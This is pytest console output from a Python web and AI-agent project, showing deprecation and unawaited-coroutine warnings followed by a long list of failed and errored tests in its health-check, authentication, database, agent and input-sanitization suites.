  /home/paul/boardroom-repo/app/core/health_checks.py:481: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    return not self._shutting_down and (datetime.utcnow() - self.startup_time).total_seconds() > 0

tests/integration/test_health_checks.py::TestHealthCaching::test_health_check_caching
  /home/paul/boardroom-repo/tests/integration/test_health_checks.py:336: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    start_time = datetime.utcnow()

tests/performance/test_ai_operations_performance.py::TestLangGraphAgentPerformance::test_memory_usage_single_query
  /home/paul/boardroom-repo/tests/performance/test_ai_operations_performance.py:102: RuntimeWarning: coroutine 'AsyncMockMixin._execute_mock_call' was never awaited
    gc.collect()
  Enable tracemalloc to get traceback where the object was allocated.
  See https://docs.pytest.org/en/stable/how-to/capture-warnings.html#resource-warnings for more info.

tests/performance/test_ai_operations_performance.py::TestAIStateManagerPerformance::test_state_manager_memory_efficiency
  /home/paul/boardroom-repo/tests/performance/test_ai_operations_performance.py:571: RuntimeWarning: coroutine 'AsyncMockMixin._execute_mock_call' was never awaited
    gc.collect()
  Enable tracemalloc to get traceback where the object was allocated.
  See https://docs.pytest.org/en/stable/how-to/capture-warnings.html#resource-warnings for more info.

tests/performance/test_performance.py::TestDatabaseServicePerformance::test_database_initialization_performance
tests/unit/test_database_service.py::TestDatabaseServiceInitialization::test_initialize_success
tests/unit/test_database_service.py::TestDatabaseServiceInitialization::test_initialize_test_environment
tests/unit/test_database_service.py::TestDatabaseServiceInitialization::test_initialize_with_retries
tests/unit/test_database_service.py::TestDatabaseServiceConfigurationVariants::test_debug_mode_configuration
tests/unit/test_database_service.py::TestDatabaseServiceConfigurationVariants::test_production_mode_configuration
  /home/paul/boardroom-repo/app/services/database.py:98: RuntimeWarning: coroutine 'AsyncMockMixin._execute_mock_call' was never awaited
    async with self._engine.begin() as conn:
  Enable tracemalloc to get traceback where the object was allocated.
  See https://docs.pytest.org/en/stable/how-to/capture-warnings.html#resource-warnings for more info.

tests/performance/test_performance.py::TestMemoryUsage::test_error_monitoring_memory_usage
  /home/paul/.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/logging/__init__.py:468: RuntimeWarning: coroutine 'AsyncMockMixin._execute_mock_call' was never awaited
    return self._fmt % values
  Enable tracemalloc to get traceback where the object was allocated.
  See https://docs.pytest.org/en/stable/how-to/capture-warnings.html#resource-warnings for more info.

tests/performance/test_performance_optimization.py::TestMemoryManagement::test_memory_pressure_handling
  /home/paul/boardroom-repo/app/core/memory_management.py:69: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    'timestamp': datetime.utcnow(),

tests/performance/test_performance_optimization.py: 12 warnings
  /home/paul/boardroom-repo/app/core/advanced_caching.py:129: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    created_at=datetime.utcnow(),

tests/performance/test_performance_optimization.py: 20 warnings
  /home/paul/boardroom-repo/app/core/advanced_caching.py:185: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    age = (datetime.utcnow() - entry.created_at).total_seconds()

tests/performance/test_performance_optimization.py: 17 warnings
  /home/paul/boardroom-repo/app/core/advanced_caching.py:203: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    entry.last_accessed = datetime.utcnow()

tests/performance/test_performance_optimization.py::TestAdvancedCaching::test_predictive_cache_patterns
tests/performance/test_performance_optimization.py::TestPerformanceBenchmarks::test_ai_operation_response_time
  /home/paul/boardroom-repo/app/core/advanced_caching.py:259: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    now = datetime.utcnow()

tests/test_basic_infrastructure.py::test_user_factory_fixture
tests/test_basic_infrastructure.py::test_user_factory_fixture
tests/test_infrastructure.py::test_user_factory_fixture
tests/test_infrastructure.py::test_user_factory_fixture
  /home/paul/boardroom-repo/tests/fixtures/data_fixtures.py:38: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    "created_at": datetime.utcnow(),

tests/test_basic_infrastructure.py::test_user_factory_fixture
tests/test_basic_infrastructure.py::test_user_factory_fixture
tests/test_infrastructure.py::test_user_factory_fixture
tests/test_infrastructure.py::test_user_factory_fixture
  /home/paul/boardroom-repo/tests/fixtures/data_fixtures.py:39: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    "updated_at": datetime.utcnow(),

tests/test_basic_infrastructure.py::test_boardroom_factory_fixture
tests/test_basic_infrastructure.py::test_boardroom_factory_fixture
tests/test_infrastructure.py::test_boardroom_factory_fixture
tests/test_infrastructure.py::test_boardroom_factory_fixture
  /home/paul/boardroom-repo/tests/fixtures/data_fixtures.py:67: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    "created_at": datetime.utcnow(),

tests/test_basic_infrastructure.py::test_boardroom_factory_fixture
tests/test_basic_infrastructure.py::test_boardroom_factory_fixture
tests/test_infrastructure.py::test_boardroom_factory_fixture
tests/test_infrastructure.py::test_boardroom_factory_fixture
  /home/paul/boardroom-repo/tests/fixtures/data_fixtures.py:68: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    "updated_at": datetime.utcnow(),

tests/test_basic_infrastructure.py::test_error_response_factory
tests/test_basic_infrastructure.py::test_error_response_factory
tests/test_infrastructure.py::test_error_response_factory
tests/test_infrastructure.py::test_error_response_factory
  /home/paul/boardroom-repo/tests/fixtures/data_fixtures.py:261: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    "timestamp": datetime.utcnow().isoformat(),

tests/unit/test_ai_state_manager.py::TestAIStateManager::test_state_manager_initialization
  tests/unit/test_ai_state_manager.py:46: PytestWarning: The test <Function test_state_manager_initialization> is marked with '@pytest.mark.asyncio' but it is not an async function. Please remove the asyncio mark. If the test is not marked explicitly, check for global marks applied via 'pytestmark'.
    def test_state_manager_initialization(self, state_manager):

tests/unit/test_database_service.py::TestDatabaseServiceUserOperations::test_create_user_success
tests/unit/test_database_service.py::TestDatabaseServiceAdvancedOperations::test_create_user_with_duplicate_email
  /home/paul/boardroom-repo/app/services/database.py:210: RuntimeWarning: coroutine 'AsyncMockMixin._execute_mock_call' was never awaited
    session.add(user)
  Enable tracemalloc to get traceback where the object was allocated.
  See https://docs.pytest.org/en/stable/how-to/capture-warnings.html#resource-warnings for more info.

tests/unit/test_database_service.py::TestDatabaseServiceAdvancedOperations::test_database_transaction_rollback
  /home/paul/boardroom-repo/tests/unit/test_database_service.py:747: RuntimeWarning: coroutine 'AsyncMockMixin._execute_mock_call' was never awaited
    session.add(mock_user)
  Enable tracemalloc to get traceback where the object was allocated.
  See https://docs.pytest.org/en/stable/how-to/capture-warnings.html#resource-warnings for more info.

tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_agent_initialization
  tests/unit/test_langgraph_graph.py:59: PytestWarning: The test <Function test_agent_initialization> is marked with '@pytest.mark.asyncio' but it is not an async function. Please remove the asyncio mark. If the test is not marked explicitly, check for global marks applied via 'pytestmark'.
    def test_agent_initialization(self, agent):

tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_get_model_kwargs_development
  tests/unit/test_langgraph_graph.py:66: PytestWarning: The test <Function test_get_model_kwargs_development> is marked with '@pytest.mark.asyncio' but it is not an async function. Please remove the asyncio mark. If the test is not marked explicitly, check for global marks applied via 'pytestmark'.
    @patch('app.core.langgraph.graph.settings')

tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_get_model_kwargs_production
  tests/unit/test_langgraph_graph.py:78: PytestWarning: The test <Function test_get_model_kwargs_production> is marked with '@pytest.mark.asyncio' but it is not an async function. Please remove the asyncio mark. If the test is not marked explicitly, check for global marks applied via 'pytestmark'.
    @patch('app.core.langgraph.graph.settings')

tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_should_continue_no_tool_calls
  tests/unit/test_langgraph_graph.py:274: PytestWarning: The test <Function test_should_continue_no_tool_calls> is marked with '@pytest.mark.asyncio' but it is not an async function. Please remove the asyncio mark. If the test is not marked explicitly, check for global marks applied via 'pytestmark'.
    def test_should_continue_no_tool_calls(self, agent, sample_graph_state):

tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_should_continue_with_tool_calls
  tests/unit/test_langgraph_graph.py:288: PytestWarning: The test <Function test_should_continue_with_tool_calls> is marked with '@pytest.mark.asyncio' but it is not an async function. Please remove the asyncio mark. If the test is not marked explicitly, check for global marks applied via 'pytestmark'.
    def test_should_continue_with_tool_calls(self, agent):

tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_clear_chat_history
  /home/paul/boardroom-repo/app/core/langgraph/graph.py:540: RuntimeWarning: coroutine 'AsyncMockMixin._execute_mock_call' was never awaited
    async with conn_pool.connection() as conn:
  Enable tracemalloc to get traceback where the object was allocated.
  See https://docs.pytest.org/en/stable/how-to/capture-warnings.html#resource-warnings for more info.

tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_process_messages
  tests/unit/test_langgraph_graph.py:425: PytestWarning: The test <Function test_process_messages> is marked with '@pytest.mark.asyncio' but it is not an async function. Please remove the asyncio mark. If the test is not marked explicitly, check for global marks applied via 'pytestmark'.
    def test_process_messages(self, agent):

tests/unit/test_security_schemas.py::TestSecretMetadata::test_secret_metadata_custom_values
  /home/paul/boardroom-repo/tests/unit/test_security_schemas.py:209: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    expires_at = datetime.utcnow() + timedelta(days=30)

tests/unit/test_security_schemas.py::TestSecretMetadata::test_secret_metadata_custom_values
  /home/paul/boardroom-repo/tests/unit/test_security_schemas.py:210: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    last_accessed = datetime.utcnow() - timedelta(hours=1)

tests/unit/test_security_schemas.py::TestStoredSecret::test_stored_secret_with_backup_info
  /home/paul/boardroom-repo/tests/unit/test_security_schemas.py:340: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    last_backup = datetime.utcnow() - timedelta(hours=1)

tests/unit/test_security_schemas.py::TestSecurityViolation::test_security_violation_with_details
  /home/paul/boardroom-repo/tests/unit/test_security_schemas.py:380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    resolved_at = datetime.utcnow()

tests/unit/test_security_schemas.py::TestSecurityScanResult::test_security_scan_result_with_violations
  /home/paul/boardroom-repo/tests/unit/test_security_schemas.py:498: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    completed_at = datetime.utcnow()

tests/unit/test_security_schemas.py::TestSecretResponse::test_secret_response_creation
  /home/paul/boardroom-repo/tests/unit/test_security_schemas.py:772: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    created_at = datetime.utcnow()

tests/unit/test_security_schemas.py::TestSecretResponse::test_secret_response_optional_fields
  /home/paul/boardroom-repo/tests/unit/test_security_schemas.py:802: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    created_at = datetime.utcnow()

tests/unit/test_security_schemas.py::TestHealthCheck::test_health_check_with_issues
  /home/paul/boardroom-repo/tests/unit/test_security_schemas.py:843: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    last_scan = datetime.utcnow() - timedelta(hours=1)

tests/unit/test_workflow.py::TestCallLLM::test_call_llm_missing_env_vars
  /home/paul/boardroom-repo/app/utils/workflow.py:30: RuntimeWarning: coroutine 'AsyncMockMixin._execute_mock_call' was never awaited
    response.raise_for_status()
  Enable tracemalloc to get traceback where the object was allocated.
  See https://docs.pytest.org/en/stable/how-to/capture-warnings.html#resource-warnings for more info.

tests/unit/test_workflow.py::TestCallLLM::test_call_llm_missing_env_vars
  /home/paul/boardroom-repo/app/utils/workflow.py:31: RuntimeWarning: coroutine 'AsyncMockMixin._execute_mock_call' was never awaited
    return response.json()["choices"][0]["message"]["content"]
  Enable tracemalloc to get traceback where the object was allocated.
  See https://docs.pytest.org/en/stable/how-to/capture-warnings.html#resource-warnings for more info.

-- Docs: https://docs.pytest.org/en/stable/how-to/capture-warnings.html
=========================== short test summary info ============================
FAILED tests/integration/test_api_standards.py::TestAPIStandards::test_standard_headers_present
FAILED tests/integration/test_api_standards.py::TestAPIStandards::test_api_version_info_endpoint
FAILED tests/integration/test_api_standards.py::TestAPIStandards::test_detailed_health_endpoint
FAILED tests/integration/test_api_standards.py::TestAPIConsistency::test_error_response_consistency
FAILED tests/integration/test_api_standards.py::TestAPIConsistency::test_cors_headers_present
FAILED tests/integration/test_api_standards.py::TestAPIVersioning::test_version_header_support
FAILED tests/integration/test_api_standards.py::TestAPIVersioning::test_unsupported_version_handling
FAILED tests/integration/test_health_checks.py::TestHealthCheckService::test_redis_health_check
FAILED tests/integration/test_health_checks.py::TestHealthEndpoints::test_basic_health_endpoint
FAILED tests/integration/test_health_checks.py::TestHealthEndpoints::test_readiness_endpoint
FAILED tests/integration/test_health_checks.py::TestHealthEndpoints::test_liveness_endpoint
FAILED tests/integration/test_health_checks.py::TestHealthEndpoints::test_detailed_health_endpoint
FAILED tests/integration/test_health_checks.py::TestHealthEndpoints::test_dependencies_endpoint
FAILED tests/integration/test_health_checks.py::TestHealthEndpoints::test_circuit_breakers_endpoint
FAILED tests/integration/test_health_checks.py::TestHealthEndpoints::test_metrics_endpoint
FAILED tests/integration/test_health_checks.py::TestExternalAPIHealthCheck::test_external_api_health_check_success
FAILED tests/integration/test_health_checks.py::TestExternalAPIHealthCheck::test_external_api_health_check_failure
FAILED tests/performance/test_ai_operations_performance.py::TestLangGraphAgentPerformance::test_agent_initialization_time
FAILED tests/performance/test_ai_operations_performance.py::TestLangGraphAgentPerformance::test_single_query_response_time
FAILED tests/performance/test_ai_operations_performance.py::TestLangGraphAgentPerformance::test_concurrent_queries_performance
FAILED tests/performance/test_ai_operations_performance.py::TestLangGraphAgentPerformance::test_memory_usage_single_query
FAILED tests/performance/test_ai_operations_performance.py::TestLangGraphAgentPerformance::test_streaming_response_performance
FAILED tests/performance/test_ai_operations_performance.py::TestLangGraphAgentPerformance::test_chat_history_performance
FAILED tests/performance/test_ai_operations_performance.py::TestLangGraphAgentPerformance::test_sustained_load_performance
FAILED tests/performance/test_ai_operations_performance.py::TestAIOperationsLoadTesting::test_high_concurrency_ai_operations
FAILED tests/performance/test_ai_operations_performance.py::TestAIOperationsLoadTesting::test_sustained_load_performance
FAILED tests/performance/test_ai_operations_performance.py::TestAIOperationsLoadTesting::test_resource_exhaustion_handling
FAILED tests/performance/test_ai_operations_performance.py::TestAIOperationsLoadTesting::test_memory_pressure_handling
FAILED tests/performance/test_performance.py::TestDatabaseServicePerformance::test_database_initialization_performance
FAILED tests/performance/test_performance.py::TestMemoryUsage::test_error_monitoring_memory_usage
FAILED tests/unit/test_auth_utils.py::TestCreateAccessToken::test_create_access_token_includes_sanitized_jti
FAILED tests/unit/test_auth_utils.py::TestVerifyToken::test_verify_token_valid
FAILED tests/unit/test_auth_utils.py::TestVerifyToken::test_verify_token_invalid_format
FAILED tests/unit/test_auth_utils.py::TestVerifyToken::test_verify_token_invalid_signature
FAILED tests/unit/test_auth_utils.py::TestAuthUtilsLogging::test_verify_token_logs_verification
FAILED tests/unit/test_auth_utils.py::TestAuthUtilsLogging::test_verify_token_logs_jwt_error
FAILED tests/unit/test_database_service.py::TestDatabaseServiceInitialization::test_initialize_success
FAILED tests/unit/test_database_service.py::TestDatabaseServiceInitialization::test_initialize_test_environment
FAILED tests/unit/test_database_service.py::TestDatabaseServiceInitialization::test_initialize_with_retries
FAILED tests/unit/test_database_service.py::TestDatabaseServiceSessionManagement::test_get_session_initializes_if_needed
FAILED tests/unit/test_database_service.py::TestDatabaseServiceSessionManagement::test_get_session_operational_error_handling
FAILED tests/unit/test_database_service.py::TestDatabaseServiceSessionManagement::test_get_session_sqlalchemy_error_handling
FAILED tests/unit/test_database_service.py::TestDatabaseServiceSessionManagement::test_get_session_generic_error_handling
FAILED tests/unit/test_database_service.py::TestDatabaseServiceHealthCheck::test_health_check_healthy
FAILED tests/unit/test_database_service.py::TestDatabaseServiceHealthCheck::test_health_check_initializes_if_needed
FAILED tests/unit/test_database_service.py::TestDatabaseServiceSingleton::test_database_service_singleton_configuration
FAILED tests/unit/test_database_service.py::TestDatabaseServiceErrorHandling::test_session_error_during_operation
FAILED tests/unit/test_database_service.py::TestDatabaseServiceErrorHandling::test_connection_recovery_after_operational_error
FAILED tests/unit/test_database_service.py::TestDatabaseServiceConfigurationVariants::test_debug_mode_configuration
FAILED tests/unit/test_database_service.py::TestDatabaseServiceConfigurationVariants::test_production_mode_configuration
FAILED tests/unit/test_database_service.py::TestDatabaseServiceAdvancedOperations::test_create_user_with_duplicate_email
FAILED tests/unit/test_database_service.py::TestDatabaseServiceAdvancedOperations::test_database_transaction_rollback
FAILED tests/unit/test_database_service.py::TestDatabaseServiceAdvancedOperations::test_database_connection_timeout
FAILED tests/unit/test_database_service.py::TestDatabaseServiceLegacyMethods::test_get_session_maker_method
FAILED tests/unit/test_error_monitoring.py::TestErrorMonitorEdgeCases::test_window_edge_case_exactly_at_cutoff
FAILED tests/unit/test_exceptions.py::TestBoardroomException::test_boardroom_exception_basic
FAILED tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_get_model_kwargs_development
FAILED tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_get_model_kwargs_production
FAILED tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_chat_success
FAILED tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_chat_with_token_usage
FAILED tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_chat_llm_error_retry
FAILED tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_chat_max_retries_exceeded
FAILED tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_tool_call_tool_not_found
FAILED tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_create_graph_success
FAILED tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_create_graph_no_checkpointer
FAILED tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_get_response_success
FAILED tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_get_stream_response
FAILED tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_get_chat_history
FAILED tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_clear_chat_history
FAILED tests/unit/test_meeting_management_tools.py::TestCreateMeetingAgendaTool::test_time_allocation_calculation
FAILED tests/unit/test_sanitization.py::TestSanitizeString::test_sanitize_string_html_escape
FAILED tests/unit/test_sanitization.py::TestSanitizeString::test_sanitize_string_remove_null_bytes
FAILED tests/unit/test_sanitization.py::TestSanitizeEmail::test_sanitize_email_invalid_format
FAILED tests/unit/test_sanitization.py::TestSanitizeDict::test_sanitize_dict_nested
FAILED tests/unit/test_sanitization.py::TestSanitizeList::test_sanitize_list_with_html
FAILED tests/unit/test_sanitization.py::TestSanitizeFilename::test_sanitize_filename_path_traversal
FAILED tests/unit/test_sanitization.py::TestSanitizeSqlLikePattern::test_sanitize_sql_like_pattern_normal
FAILED tests/unit/test_sanitization.py::TestSanitizeJsonData::test_sanitize_json_data_simple
FAILED tests/unit/test_sanitization.py::TestSanitizeUrl::test_sanitize_url_dangerous_schemes
FAILED tests/unit/test_sanitization.py::TestSanitizeUrl::test_sanitize_url_malformed
FAILED tests/unit/test_sanitization.py::TestSanitizationIntegration::test_comprehensive_sanitization
FAILED tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_string_advanced_xss_attempts
FAILED tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_string_sql_injection_attempts
FAILED tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_string_command_injection_attempts
FAILED tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_string_unicode_bypass_attempts
FAILED tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_string_empty_and_whitespace
FAILED tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_dict_deep_nesting_attack
FAILED tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_list_large_list_attack
FAILED tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_filename_path_traversal_variants
FAILED tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_validate_password_strength_comprehensive
FAILED tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_validate_uuid_string_format_variations
FAILED tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_json_data_attack_vectors
FAILED tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_url_comprehensive_attacks
FAILED tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitization_performance_with_large_data
FAILED tests/unit/test_sanitization.py::TestSanitizationSecurityBoundaries::test_sanitization_encoding_preservation
FAILED tests/unit/test_security_schemas.py::TestRotationPolicy::test_rotation_policy_edge_cases
FAILED tests/unit/test_workflow.py::TestWorkflowModule::test_workflow_initialization
ERROR tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_ai_health_check_success
ERROR tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_ai_health_check_degraded_performance
ERROR tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_ai_health_check_error_handling
ERROR tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_get_active_sessions_success
ERROR tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_get_active_sessions_empty
ERROR tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_create_session_checkpoint_success
ERROR tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_create_session_checkpoint_error
ERROR tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_restore_session_checkpoint_success
ERROR tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_restore_session_checkpoint_error
ERROR tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_cleanup_expired_sessions_success
ERROR tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_cleanup_expired_sessions_default_expiry
ERROR tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_cleanup_expired_sessions_error
ERROR tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_get_ai_metrics_summary_success
ERROR tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_get_ai_metrics_summary_error
ERROR tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_rate_limiting
ERROR tests/integration/test_ai_operations_endpoints.py::TestAIOperationsAuthentication::test_health_check_without_auth
ERROR tests/integration/test_ai_operations_endpoints.py::TestAIOperationsAuthentication::test_active_sessions_without_auth
ERROR tests/integration/test_ai_operations_endpoints.py::TestAIOperationsAuthentication::test_checkpoint_creation_without_auth
ERROR tests/integration/test_ai_operations_endpoints.py::TestAIOperationsAuthentication::test_metrics_summary_without_auth
ERROR tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndToEnd::test_session_management_workflow
ERROR tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndToEnd::test_health_monitoring_workflow
ERROR tests/integration/test_ai_operations_endpoints.py::TestAIOperationsPerformance::test_health_check_response_time
ERROR tests/integration/test_ai_operations_endpoints.py::TestAIOperationsPerformance::test_metrics_summary_response_time
ERROR tests/integration/test_ai_operations_endpoints.py::TestAIOperationsPerformance::test_concurrent_requests_handling
ERROR tests/integration/test_ai_operations_endpoints.py::TestAIOperationsPerformance::test_session_operations_performance
ERROR tests/integration/test_ai_operations_endpoints.py::TestAIOperationsPerformance::test_throughput_under_sustained_load
ERROR tests/integration/test_auth_endpoints.py::TestAuthenticationEndpoints::test_user_login_success
ERROR tests/integration/test_auth_endpoints.py::TestAuthenticationEndpoints::test_user_login_invalid_credentials
ERROR tests/integration/test_auth_endpoints.py::TestAuthenticationEndpoints::test_user_login_wrong_password
ERROR tests/integration/test_auth_endpoints.py::TestAuthenticationEndpoints::test_user_login_inactive_user
ERROR tests/integration/test_auth_endpoints.py::TestAuthenticationEndpoints::test_user_login_invalid_input
ERROR tests/integration/test_auth_endpoints.py::TestAuthenticationEndpoints::test_user_register_success
ERROR tests/integration/test_auth_endpoints.py::TestAuthenticationEndpoints::test_user_register_duplicate_email
ERROR tests/integration/test_auth_endpoints.py::TestAuthenticationEndpoints::test_user_register_weak_password
ERROR tests/integration/test_auth_endpoints.py::TestAuthenticationEndpoints::test_user_register_invalid_input
ERROR tests/integration/test_auth_endpoints.py::TestTokenValidation::test_protected_endpoint_with_valid_token
ERROR tests/integration/test_auth_endpoints.py::TestTokenValidation::test_protected_endpoint_with_invalid_token
ERROR tests/integration/test_auth_endpoints.py::TestTokenValidation::test_protected_endpoint_without_token
ERROR tests/integration/test_auth_endpoints.py::TestAuthenticationFlow::test_register_login_flow
ERROR tests/integration/test_auth_endpoints.py::TestAuthenticationFlow::test_multiple_login_attempts
ERROR tests/integration/test_auth_endpoints.py::TestAuthenticationSecurity::test_sql_injection_prevention
ERROR tests/integration/test_auth_endpoints.py::TestAuthenticationSecurity::test_xss_prevention_in_registration
ERROR tests/integration/test_auth_endpoints.py::TestAuthenticationSecurity::test_password_not_returned_in_responses
ERROR tests/integration/test_auth_endpoints.py::TestAuthenticationSecurity::test_case_insensitive_email_handling
ERROR tests/integration/test_auth_endpoints.py::TestAuthenticationRateLimiting::test_login_rate_limiting
ERROR tests/integration/test_boardroom_endpoints.py::TestBoardroomEndpoints::test_create_boardroom_success
ERROR tests/integration/test_boardroom_endpoints.py::TestBoardroomEndpoints::test_create_boardroom_unauthorized
ERROR tests/integration/test_boardroom_endpoints.py::TestBoardroomEndpoints::test_create_boardroom_missing_token
ERROR tests/integration/test_boardroom_endpoints.py::TestBoardroomEndpoints::test_create_boardroom_invalid_input
ERROR tests/integration/test_boardroom_endpoints.py::TestBoardroomEndpoints::test_get_boardroom_success
ERROR tests/integration/test_boardroom_endpoints.py::TestBoardroomEndpoints::test_get_boardroom_not_found
ERROR tests/integration/test_boardroom_endpoints.py::TestBoardroomEndpoints::test_list_boardrooms_success
ERROR tests/integration/test_boardroom_endpoints.py::TestBoardroomEndpoints::test_update_boardroom_success
ERROR tests/integration/test_boardroom_endpoints.py::TestBoardroomEndpoints::test_update_boardroom_not_owner
ERROR tests/integration/test_boardroom_endpoints.py::TestBoardroomEndpoints::test_delete_boardroom_success
ERROR tests/integration/test_boardroom_endpoints.py::TestBoardroomEndpoints::test_delete_boardroom_not_owner
ERROR tests/integration/test_boardroom_endpoints.py::TestBoardroomSessionEndpoints::test_create_session_success
ERROR tests/integration/test_boardroom_endpoints.py::TestBoardroomSessionEndpoints::test_get_session_success
ERROR tests/integration/test_boardroom_endpoints.py::TestBoardroomSessionEndpoints::test_list_sessions_success
ERROR tests/integration/test_boardroom_endpoints.py::TestBoardroomSessionEndpoints::test_end_session_success
ERROR tests/integration/test_boardroom_endpoints.py::TestBoardroomPermissions::test_admin_can_access_any_boardroom
ERROR tests/integration/test_boardroom_endpoints.py::TestBoardroomPermissions::test_user_cannot_access_private_boardroom
ERROR tests/integration/test_boardroom_endpoints.py::TestBoardroomPermissions::test_user_can_access_public_boardroom
ERROR tests/integration/test_boardroom_endpoints.py::TestBoardroomValidation::test_boardroom_name_validation
ERROR tests/integration/test_boardroom_endpoints.py::TestBoardroomValidation::test_boardroom_settings_validation
ERROR tests/integration/test_boardroom_endpoints.py::TestBoardroomErrorHandling::test_database_error_handling
ERROR tests/integration/test_boardroom_endpoints.py::TestBoardroomErrorHandling::test_concurrent_access_handling
ERROR tests/integration/test_monitoring_endpoints.py::TestHealthEndpoints::test_health_check_healthy
ERROR tests/integration/test_monitoring_endpoints.py::TestHealthEndpoints::test_health_check_unhealthy_database
ERROR tests/integration/test_monitoring_endpoints.py::TestHealthEndpoints::test_root_endpoint
